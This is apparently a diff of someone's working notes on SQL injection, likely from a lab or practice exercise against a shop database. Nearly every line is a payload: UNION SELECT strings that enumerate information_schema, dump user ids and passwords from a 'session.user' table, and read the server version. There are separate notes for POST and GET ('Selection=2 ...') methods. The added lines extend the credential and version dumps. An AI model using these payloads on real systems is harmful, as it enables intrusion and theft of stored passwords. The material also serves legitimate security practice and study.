@@ -36,6 +36,7 @@ Audi' UNION SELECT table_schema,2,table_name,column_name,5 FROM information_sche
 look at session colum
 Audi' UNION SELECT tireid,2,name,size,cost FROM session.Tires;#
 Audi' UNION SELECT id,2,name,pass,5 FROM session.user;#
+Audi' union select @@version,2,3,4,5; #
 
 -------------------------------------GET METHOD-----------------------------------------
 dropdown
@@ -44,4 +45,5 @@ OR 1=1
 find vulnerable selection
 Selection=2 UNION SELECT 1,2,3 (table came back as 1,3,2, KEEP IN MIND)
 2 UNION SELECT table_schema,column_name,table_name FROM information_schema.columns
-
+2 UNION select id,pass,name from session.user
+Selection=2 UNION select 1,2,@@version
